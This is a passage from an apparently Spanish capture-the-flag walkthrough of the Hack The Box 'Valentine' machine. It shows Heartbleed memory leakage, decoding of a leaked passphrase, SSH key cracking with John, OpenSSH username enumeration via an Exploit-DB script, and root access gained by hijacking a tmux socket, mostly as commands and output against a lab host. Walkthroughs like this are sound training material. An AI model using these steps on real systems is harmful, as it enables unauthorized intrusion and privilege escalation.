msf6 auxiliary(scanner/ssl/openssl_heartbleed) > exploit
[*] 10.10.10.79:443       - Leaking heartbeat response #1
[*] 10.10.10.79:443       - Sending Client Hello...
[*] 10.10.10.79:443       - SSL record #1:
[*] 10.10.10.79:443       -     Type:    22
[*] 10.10.10.79:443       -     Version: 0x0301
[*] 10.10.10.79:443       -     Length:  86
[*] 10.10.10.79:443       -     Handshake #1:
[*] 10.10.10.79:443       -             Length: 82
...
```
La respuesta es mucho más larga, pero podemos ver la data en **base64** que ya habiamos obtenido antes.

### Descifrando Data en Base64 y Hash {#Base64}

Vamos a copiar solamente la data de **base64** en un archivo:
```bash
nano text
cat text      
aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
```

Y ahora, usemos el comando **base64** para ver si puede descifrar que es esta data:
```bash
cat text| base64 -d
heartbleedbelievethehype
```
Mmmmmm a mi parecer esto es una contraseña. ¿Será que es la contraseña para desencriptar la llave privada?, o ¿es la contraseña de un usuario?

Como no tenemos un usuario todavia, vamos a probar si es la contraseña para la llave privada.
```bash
john -w=diccionario.txt hash                 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
heartbleedbelievethehype (id_rsa)     
1g 0:00:00:00 DONE (2023-04-21 15:06) 16.66g/s 16.66p/s 16.66c/s 16.66C/s heartbleedbelievethehype
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Pefecto si es, ya tenemos una contraseña para el **SSH**, pero nos falta un usuario. 

Vamos a hacer lo que hicimos en la **máquina Nibbles**, a probar con todo.

### Buscando un Usuario Valido para Servicio SSH {#Usuario}

Lo que vamos a probar como usuarios, serán los siguientes:
* *valentine*
* *heart*
* *bleed*
* *heartbleed*
* *believe*
* *hype*

Para probarlos, vamos a usar un Exploit que ya utilizamos una vez en la **máquina Blocky**, busquémoslo con **Searchsploit**:
```bash
searchsploit ssh enum    
----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path

|---|---|
OpenSSH 2.3 < 7.7 - Username Enumeration                                                             | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                       | linux/remote/45210.py
OpenSSH 7.2p2 - Username Enumeration                                                                 | linux/remote/40136.py
OpenSSH < 7.7 - User Enumeration (2)                                                                 | linux/remote/45939.py
OpenSSHd 7.2p2 - Username Enumeration                                                                | linux/remote/40113.txt

|---|---|
Shellcodes: No Results
Papers: No Results
```

Copiemos el Exploit:
```bash
searchsploit -m linux/remote/45939.py
  Exploit: OpenSSH < 7.7 - User Enumeration (2)
      URL: https://www.exploit-db.com/exploits/45939
     Path: /usr/share/exploitdb/exploits/linux/remote/45939.py
    Codes: CVE-2018-15473
 Verified: False
File Type: Python script, ASCII text executable
```

Y ahora sí, probemos los usuarios que tenemos:
```bash
python2 SSH_Exploit.py 10.10.10.79 valentine 2>/dev/null                                                  
[-] valentine is an invalid username

python2 SSH_Exploit.py 10.10.10.79 heart 2>/dev/null
[-] heart is an invalid username

python2 SSH_Exploit.py 10.10.10.79 bleed 2>/dev/null
[-] bleed is an invalid username

python2 SSH_Exploit.py 10.10.10.79 heartbleed 2>/dev/null
[-] heartbleed is an invalid username

python2 SSH_Exploit.py 10.10.10.79 hype 2>/dev/null
[+] hype is a valid username
```
¡Encontramos uno! Vamos a probar si podemos entrar al servicio **SSH** con ese usuario, con la llave privada **id_rsa** y con la contraseña **heartbleedbelievethehype**.

-------
**IMPORTANTE**

No podía entrar al servicio **SSH** porque al parecer, necesitas hacer un archivo con unas líneas de código para que el **SSH** acepte llaves tipo **rsa**, aquí lo explican mejor que yo:
* <a href="https://stackoverflow.com/questions/73795935/sign-and-send-pubkey-no-mutual-signature-supported" target="_blank">Sign_and_send_pubkey: no mutual signature supported</a>

Entonces crea el archivo **config** y añade las 2 líneas de código que mencionan:
```bash
nano ~/.ssh/config
Host *
    PubkeyAcceptedKeyTypes=+ssh-rsa
    HostKeyAlgorithms=+ssh-rsa
```
Guarda y cierra.

--------

Ahora trata de entrar:
```bash
ssh hype@10.10.10.79 -i id_rsa                                      
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3
hype@Valentine:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
hype@Valentine:~$ cd Desktop/
hype@Valentine:~/Desktop$ ls
user.txt
hype@Valentine:~/Desktop$ cat user.txt
```
Listo, tenemos la flag del usuario. Busquemos como escalar privilegios.

## Post Explotación {#Post}

### Enumerando Máquina y Escalando Privilegios con Tmux {#Enum}

Tratemos de ver nuestros privilegios:
```bash
hype@Valentine:~/Desktop$ id
uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare)
hype@Valentine:~/Desktop$ sudo -l
[sudo] password for hype: 
Sorry, try again.
```

Mmmmm esto va a estar complicado, veamos si no hay un archivo oculto por ahí:
```bash
hype@Valentine:~/Desktop$ cd ..
hype@Valentine:~$ ls -la
total 192
drwxr-xr-x 21 hype hype  4096 Apr 21 15:04 .
drwxr-xr-x  3 root root  4096 Dec 11  2017 ..
-rw-------  1 hype hype   131 Feb 16  2018 .bash_history
-rw-r--r--  1 hype hype   220 Dec 11  2017 .bash_logout
-rw-r--r--  1 hype hype  3486 Dec 11  2017 .bashrc
drwx------ 11 hype hype  4096 Dec 11  2017 .cache
drwx------  9 hype hype  4096 Dec 11  2017 .config
drwx------  3 hype hype  4096 Dec 11  2017 .dbus
drwxr-xr-x  2 hype hype  4096 Aug 25  2022 Desktop
-rw-r--r--  1 hype hype    26 Dec 11  2017 .dmrc
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Documents
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Downloads
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 .fontconfig
drwx------  3 hype hype  4096 Dec 11  2017 .gconf
drwx------  4 hype hype  4096 Dec 11  2017 .gnome2
-rw-rw-r--  1 hype hype   132 Dec 11  2017 .gtk-bookmarks
drwx------  2 hype hype  4096 Dec 11  2017 .gvfs
-rw-------  1 hype hype   636 Dec 11  2017 .ICEauthority
drwxr-xr-x  3 hype hype  4096 Dec 11  2017 .local
drwx------  3 hype hype  4096 Dec 11  2017 .mission-control
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Music
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Pictures
-rw-r--r--  1 hype hype   675 Dec 11  2017 .profile
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Public
drwx------  2 hype hype  4096 Dec 11  2017 .pulse
-rw-------  1 hype hype   256 Dec 11  2017 .pulse-cookie
drwx------  2 hype hype  4096 Dec 13  2017 .ssh
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Templates
-rw-rw-r--  1 hype hype    26 Apr 21 15:04 tmux-client-5340.log
-rw-r--r--  1 root root    39 Dec 13  2017 .tmux.conf
-rw-rw-r--  1 hype hype 37799 Apr 21 15:04 tmux-server-5342.log
-rw-rw-r--  1 hype hype    33 Apr 21 11:07 user.txt
drwxr-xr-x  2 hype hype  4096 Dec 11  2017 Videos
-rw-------  1 hype hype     0 Dec 11  2017 .Xauthority
-rw-------  1 hype hype 12173 Dec 11  2017 .xsession-errors
-rw-------  1 hype hype  9659 Dec 11  2017 .xsession-errors.old
```

Hay muchas cosas, pero una me llama la atención, es el **.bash_history**, ya que normalmente, solo el Root lo puede ver. 

Vamos a verlo:
```bash
hype@Valentine:~$ cat .bash_history 

exit
exot
exit
ls -la
cd /
ls -la
cd .devs
ls -la
tmux -L dev_sess 
tmux a -t dev_sess 
tmux --help
tmux -S /.devs/dev_sess 
exit
```
No sé qué es eso de **tmux**, vamos a investigarlo:

| **Tmux** |
|:-----------:|
| *tmux es un multiplexor de terminal para sistemas tipo unix, similar a GNU Screen o Byobu que permite dividir una consola en múltiples secciones o generar sesiones independientes en la misma terminal.* |

Me recuerda a la herramienta **Terminator** que divide las terminales, supongo que es similar.

Ahora, busquemos si se pueden escalar privilegios. 

Encontré dos cosas:
* Un Exploit que sirve para las **versiones 1.3 y 1.4**, veamos que versión de **tmux** usa esta máquina:
```bash
hype@Valentine:~$ tmux -V
tmux 1.6
```
Mmmmm quizá no sirva.

* Este blog: <a href="https://int0x33.medium.com/day-69-hijacking-tmux-sessions-2-priv-esc-f05893c4ded0" target="_blank">Day 69: Hijacking Tmux Sessions 2 Priv. Esc.</a>

El blog explica como escalar privilegios usando un comando de **tmux**, que es el mismo que aparece en el historial. 

Vamos a usarlo:
```bash
hype@Valentine:~$ tmux -S /.devs/dev_sess
root@Valentine:/home/hype# whoami
root
root@Valentine:/home/hype# cd /root
root@Valentine:~# ls  
curl.sh  root.txt
root@Valentine:~# cat root.txt
```
Wow, nos metió como a otra consola y somos **Root**. Bueno, ahí está la flag y con esto terminamos la máquina.
